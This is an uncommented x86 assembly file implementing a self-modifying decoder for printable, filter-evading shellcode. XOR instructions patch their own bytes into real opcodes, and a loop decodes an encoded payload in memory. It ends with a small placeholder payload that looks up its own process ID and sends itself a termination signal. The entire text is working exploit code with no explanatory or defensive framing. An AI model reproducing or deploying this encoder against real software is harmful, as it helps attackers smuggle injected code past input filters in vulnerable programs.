.text
.global anchor
initializer:
	pusha
	push	%eax
	pop	%ecx
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	dec	%eax
	push	%eax
	pop	%ebx
xor_patcher:
	push	$0x30			
	pop	%eax
	xorb	%bl,0x35(%ecx)		#	0x72 -> 0x8D
	xorb	%al,0x4f(%ecx)		#	0x4F^0x30->0x7F
	xorb	%bl,0x4f(%ecx)		#	0x7F ->	0x80
	xorb	%bl,0x60(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x61(%ecx)		#	0x30^0x2C -> 0x1C
	xorb	%bl,0x61(%ecx)		#	0x1C -> 0xE3
	xorb	%al,0x62(%ecx)		#	0x30^0x34 -> 0x04
	xorb	%bl,0x69(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x6a(%ecx)		#	0x30^0x27 -> 0x17
	xorb	%bl,0x6a(%ecx)		#	0x17 -> 0xE8
	xorb	%al,0x6B(%ecx)		#	0x30^0x32 -> 0x02
	xorb	%bl,0x6D(%ecx)		#	0x27 -> 0xD8
	xorb	%bl,0x6E(%ecx)		#	0x77 -> 0x88
anchor:
	.byte	0x72	
	.byte	0x49
	.byte	0x49
	xorb	%bl,0x37(%ecx)		#	0x3F -> 0xC0
	xorb	%al,0x38(%ecx)		#	0x30^0x2C -> 0x1C
	xorb	%bl,0x38(%ecx)		#	0x1C -> 0xE3
	xorb	%al,0x39(%ecx)		#	0x30^0x36 -> 0x06
	xorb	%bl,0x3D(%ecx)		#	0x27 -> 0xD8
	xorb	%bl,0x3E(%ecx)		#	0x77 -> 0x88
	xorb	%bl,0x47(%ecx)		#	0x41 -> 0xbe
	push	%ecx
	pop 	%edx
loop:
	.byte	0x4F	#cmpb   $0x26,0x5b(%ecx)
	.byte	0x79
	.byte	0x5b
	.byte	0x26
	je	end_of_payload
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	push	%eax
	pop	%ebx
	xorb	0x5b(%ecx),%bl
	inc	%ebx
	.byte	0x3F	#shlb	$4,%bl	
	.byte	0x2C
	.byte	0x34
	xorb	0x5c(%ecx),%al
	inc	%eax
	andb	$0x3C,%al
	.byte	0x3F	#shrb	$2,%al
	.byte	0x27
	.byte	0x32
	.byte	0x30	#xorb	%bl,%al
	.byte	0x27
	.byte	0x77	#mov    %al,0x5b(%edx)
	.byte	0x42
	.byte	0x5b
	push	$0x30
	pop	%eax
	xor	$0x30,%al
	push	%eax
	pop	%ebx
	xor	0x5c(%ecx),%bl
	inc	%ebx
	xor	0x5d(%ecx),%al
	inc	%eax
	.byte	0x3F	#shlb	$6,%bl	
	.byte	0x2C
	.byte	0x36
	andb	$0x3F,%al
	.byte	0x30	#xorb	%bl,%al
	.byte	0x27
	.byte	0x77	#mov    %al,0x5c(%edx)
	.byte	0x42
	.byte	0x5c
	inc	%edx
	inc 	%edx
	inc	%ecx
	inc	%ecx
	inc	%ecx
	.byte	0x75
	.byte	0x41
end_of_payload:
	popa	
handler:
	xor	%eax,%eax
	movb	$20,%al	
    	int	$0x80
	push	%eax
	pop	%ebx
	xor	%eax,%eax
	xor	%ecx,%ecx
	mov	$37,%al
	mov	$15,%cl
	int	$0x80
end:
